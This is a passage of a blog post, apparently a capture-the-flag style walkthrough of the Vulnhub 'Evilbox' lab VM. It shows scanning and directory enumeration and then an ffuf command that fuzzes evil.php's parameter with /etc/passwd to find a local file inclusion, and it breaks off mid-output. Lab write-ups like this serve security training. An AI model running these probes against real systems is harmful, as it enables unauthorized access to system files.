@@ -1,0 +1,926 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Vulnhub Evilbox - V4ler1an</title><meta name="Description" content="Vulnhub Training -- Evilbox"><meta property="og:title" content="Vulnhub Evilbox" />
+<meta property="og:description" content="Vulnhub Training -- Evilbox" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-evilbox/" /><meta property="og:image" content="https://www.v4ler1an.com/images/personal_logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-10T03:57:40+08:00" />
+<meta property="article:modified_time" content="2023-11-10T13:59:40+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://www.v4ler1an.com/images/personal_logo.png"/>
+
+<meta name="twitter:title" content="Vulnhub Evilbox"/>
+<meta name="twitter:description" content="Vulnhub Training -- Evilbox"/>
+<meta name="twitter:site" content="@YaoyaoShaw"/>
+<meta name="application-name" content="V4ler1an">
+<meta name="apple-mobile-web-app-title" content="V4ler1an"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-evilbox/" /><link rel="prev" href="https://www.v4ler1an.com/2023/11/vulnhub_hackme1/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Vulnhub Evilbox",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.v4ler1an.com\/2023\/11\/vulnhub_walkthrough-evilbox\/"
+        },"image": ["https:\/\/www.v4ler1an.com\/images\/personal_logo.png"],"genre": "posts","keywords": "Vulnhub","wordcount":  1733 ,
+        "url": "https:\/\/www.v4ler1an.com\/2023\/11\/vulnhub_walkthrough-evilbox\/","datePublished": "2023-11-10T03:57:40+08:00","dateModified": "2023-11-10T13:59:40+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/www.v4ler1an.com\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "v4ler1an"
+            },"description": "Vulnhub Training -- Evilbox"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 我 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2023/11/vulnhub_walkthrough-evilbox/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">我</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/2023/11/vulnhub_walkthrough-evilbox/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Vulnhub Evilbox</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://www.v4ler1an.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>v4ler1an</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>Web</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-10">2023-11-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1733 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 9 分钟&nbsp;<span id="/2023/11/vulnhub_walkthrough-evilbox/" class="leancloud_visitors" data-flag-title="Vulnhub Evilbox">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#knowledge">Knowledge</a></li>
+    <li><a href="#1-environment-setup">1. Environment Setup</a></li>
+    <li><a href="#2-reconnaisence">2. Reconnaisence</a>
+      <ul>
+        <li><a href="#1-ip-address">1. IP Address</a></li>
+        <li><a href="#2-port-info">2. Port Info</a></li>
+        <li><a href="#3-web-directory">3. Web Directory</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-exploit">3. Exploit</a>
+      <ul>
+        <li><a href="#1-vire-php-source">1. vire php source</a></li>
+        <li><a href="#2-local-file-include-vulnerability">2. Local File Include Vulnerability</a></li>
+        <li><a href="#3-hash-crack">3. hash crack</a></li>
+        <li><a href="#4-login-ssh">4. login ssh</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-privilege-escalation">4. Privilege Escalation</a></li>
+    <li><a href="#notes">Notes</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Vulnhub Training Waklthrough &ndash; Evilbox。</p>
+<h2 id="knowledge">Knowledge</h2>
+<ul>
+<li>gobuster &ndash; web directory scanner</li>
+<li>wfuzz &ndash; parameter fuzzing tool</li>
+<li>php filter &ndash; get the source code of php file</li>
+<li>LFI &ndash; local file include</li>
+<li>join &ndash; hash crack</li>
+<li>chang /etc/paswd file to change root&rsquo;s passwd</li>
+</ul>
+<h2 id="1-environment-setup">1. Environment Setup</h2>
+<p>OVA download link: https://www[.]vulnhub.com/entry/evilbox-one,736/</p>
+<p>If use VMware to setup the environment, need to set up the network, change the network interface enpns3 to ens33, and then restrat the network.</p>
+<h2 id="2-reconnaisence">2. Reconnaisence</h2>
+<h3 id="1-ip-address">1. IP Address</h3>
+<p>arp-scan scanner:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo arp-scan -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> v4ler1an:
+</span></span><span class="line"><span class="cl">Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138
+</span></span><span class="line"><span class="cl">Starting arp-scan 1.10.0 with <span class="m">256</span> hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+</span></span><span class="line"><span class="cl">172.16.86.1	5e:52:30:c9:b7:65	<span class="o">(</span>Unknown: locally administered<span class="o">)</span>
+</span></span><span class="line"><span class="cl">172.16.86.2	00:50:56:fd:f8:ec	VMware, Inc.
+</span></span><span class="line"><span class="cl">172.16.86.147	00:0c:29:8f:f7:63	VMware, Inc.
+</span></span><span class="line"><span class="cl">172.16.86.254	00:50:56:f7:8b:40	VMware, Inc.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">8</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
+</span></span><span class="line"><span class="cl">Ending arp-scan 1.10.0: <span class="m">256</span> hosts scanned in 2.403 seconds <span class="o">(</span>106.53 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2-port-info">2. Port Info</h3>
+<p>nmap scanner:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -T4 -A -Pn 172.16.86.147
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-11-10 03:25 EST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 172.16.86.147
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.0025s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Apache2 Debian Default Page: It works
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 6.70 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Enable service:</p>
+<table>
+<thead>
+<tr>
+<th>port</th>
+<th>servie</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>ssh</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http web</td>
+</tr>
+</tbody>
+</table>
+<p>The ssh service need username and password. The web service is a default page of Apache2:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311101634806.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311101634806.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311101634806.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311101634806.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311101634806.png"
+        title="image-20231110163355489" /></p>
+<h3 id="3-web-directory">3. Web Directory</h3>
+<p>Find the other web url:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/scan<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ dirb http://172.16.86.147
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">DIRB v2.22
+</span></span><span class="line"><span class="cl">By The Dark Raver
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">START_TIME: Fri Nov <span class="m">10</span> 03:54:10 <span class="m">2023</span>
+</span></span><span class="line"><span class="cl">URL_BASE: http://172.16.86.147/
+</span></span><span class="line"><span class="cl">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GENERATED WORDS: <span class="m">4612</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">---- Scanning URL: http://172.16.86.147/ ----
+</span></span><span class="line"><span class="cl">+ http://172.16.86.147/index.html <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:10701<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ http://172.16.86.147/robots.txt <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:12<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">==</span>&gt; DIRECTORY: http://172.16.86.147/secret/
+</span></span><span class="line"><span class="cl">+ http://172.16.86.147/server-status <span class="o">(</span>CODE:403<span class="p">|</span>SIZE:278<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">---- Entering directory: http://172.16.86.147/secret/ ----
+</span></span><span class="line"><span class="cl">+ http://172.16.86.147/secret/index.html <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:4<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">END_TIME: Fri Nov <span class="m">10</span> 03:54:25 <span class="m">2023</span>
+</span></span><span class="line"><span class="cl">DOWNLOADED: <span class="m">9224</span> - FOUND: <span class="m">4</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We found a <code>/secret</code> directory and <code>robots.txt</code> file and so on, Access the robots.txt:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ curl http://172.16.86.147/robots.txt
+</span></span><span class="line"><span class="cl">Hello H4x0r
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nothing. And access the <code>secret</code> directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/scan<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ curl http://172.16.86.147/secret/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nothing rertun, Keep find:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/scan<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ gobuster dir -u http://172.16.86.147:80/secret/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt -t <span class="nv">50</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://172.16.86.147:80/secret/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">50</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              php,html,txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/.php                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.html                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 4<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/evil.php             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.php                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.html                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">882240</span> / <span class="m">882244</span> <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Well, found a <code>evil.php</code> file, access it:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/scan<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ curl http://172.16.86.147/secret/evil.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nothing return.</p>
+<h2 id="3-exploit">3. Exploit</h2>
+<p>Consider fuzz <code>evil.php</code>&rsquo;s parameters:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/scan<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ffuf -ic -c -r -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://172.16.86.147/secret/evil.php?FUZZ<span class="o">=</span>/etc/passwd -mr <span class="s2">&#34;root:x&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="s1">&#39;___\
+</span></span></span><span class="line"><span class="cl"><span class="s1">       /\ \__/ /\ \__/  __  __  /\ \__/
+</span></span></span><span class="line"><span class="cl"><span class="s1">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+</span></span></span><span class="line"><span class="cl"><span class="s1">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+</span></span></span><span class="line"><span class="cl"><span class="s1">         \ \_\   \ \_\  \ \____/  \ \_\
+</span></span></span><span class="line"><span class="cl"><span class="s1">          \/_/    \/_/   \/___/    \/_/
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">       v2.1.0-dev
+</span></span></span><span class="line"><span class="cl"><span class="s1">________________________________________________
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1"> :: Method           : GET
+</span></span></span><span class="line"><span class="cl"><span class="s1"> :: URL              : http://172.16.86.147/secret/evil.php?FUZZ=/etc/passwd
+</span></span></span><span class="line"><span class="cl"><span class="s1"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
+</span></span></span><span class="line"><span class="cl"><span class="s1"> :: Follow redirects : true
+</span></span></span><span class="line"><span class="cl"><span class="s1"> :: Calibration      : false
+</span></span></span><span class="line"><span class="cl"><span class="s1"> :: Timeout          : 10
